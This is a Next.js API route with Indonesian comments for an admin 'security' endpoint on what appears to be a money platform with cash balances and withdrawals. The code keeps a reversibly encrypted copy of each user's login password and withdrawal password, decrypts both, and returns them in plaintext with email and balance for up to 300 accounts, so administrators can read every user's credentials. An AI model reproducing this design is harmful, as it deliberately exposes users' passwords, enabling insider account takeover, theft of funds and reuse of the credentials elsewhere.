import { NextRequest, NextResponse } from "next/server";
import { db } from "@/lib/db";
import { requireAdmin } from "@/lib/admin-auth";
import { decryptSecret } from "@/lib/secret-box";
import type { AdminSecurityRow } from "@/lib/types";

export const dynamic = "force-dynamic";

/**
 * GET /api/admin/security — sandi login & sandi penarikan setiap akun.
 * Cermin kata sandi disimpan terenkripsi (AES-256-GCM) dan didekripsi di sini
 * sehingga admin dapat melihat kredensal seluruh akun terdaftar.
 */
export async function GET(req: NextRequest) {
  const admin = requireAdmin(req);
  if (!admin) {
    return NextResponse.json({ error: "Tidak diizinkan." }, { status: 401 });
  }

  const q = req.nextUrl.searchParams.get("q")?.trim().toLowerCase() ?? "";

  try {
    const users = await db.user.findMany({
      where: q
        ? {
            OR: [
              { email: { contains: q } },
              { name: { contains: q } },
            ],
          }
        : undefined,
      orderBy: { createdAt: "desc" },
      take: 300,
      select: {
        id: true,
        email: true,
        name: true,
        cashUsd: true,
        passwordEnc: true,
        withdrawalEnc: true,
        withdrawalHash: true,
        passwordUpdatedAt: true,
        withdrawalUpdatedAt: true,
        createdAt: true,
      },
    });

    const rows: AdminSecurityRow[] = users.map((u) => {
      const loginPassword = decryptSecret(u.passwordEnc);
      const withdrawalPassword = decryptSecret(u.withdrawalEnc);
      return {
        id: u.id,
        email: u.email,
        name: u.name ?? "",
        cashUsd: u.cashUsd,
        // Akun lama (sebelum fitur ini) belum punya cermin — tampil "tidak tercatat".
        loginPassword,
        loginRecorded: loginPassword !== null,
        hasWithdrawalPassword: Boolean(u.withdrawalHash),
        withdrawalPassword,
        passwordUpdatedAt: u.passwordUpdatedAt?.toISOString() ?? null,
        withdrawalUpdatedAt: u.withdrawalUpdatedAt?.toISOString() ?? null,
        createdAt: u.createdAt.toISOString(),
      };
    });

    const withWithdrawal = rows.filter((r) => r.hasWithdrawalPassword).length;

    return NextResponse.json({
      rows,
      counts: { total: rows.length, withWithdrawal },
    });
  } catch (err) {
    console.error("admin security error", err);
    return NextResponse.json({ error: "Kesalahan server." }, { status: 500 });
  }
}
